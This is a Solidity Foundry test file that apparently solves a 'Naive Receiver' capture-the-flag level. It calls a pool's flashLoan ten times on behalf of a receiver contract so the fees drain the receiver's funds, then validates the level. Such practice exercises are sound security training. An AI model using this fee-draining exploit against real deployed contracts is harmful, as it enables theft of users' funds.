// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/naive-receiver/NaiveReceiverLevel.sol";

// we use an interface as a convenience to avoid
// dealing with a low level call
interface IPool {
  function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract NaiveReceiverTest is Test {
  NaiveReceiverLevel level = new NaiveReceiverLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    IPool pool = IPool(address(level.pool()));
    address receiverAddr = address(level.receiver());

    for (uint8 i = 0; i < 10; i++) {
      pool.flashLoan(receiverAddr, level.pool().ETH(), address(pool).balance, "0x");
    }

    level.validate();
  }
}
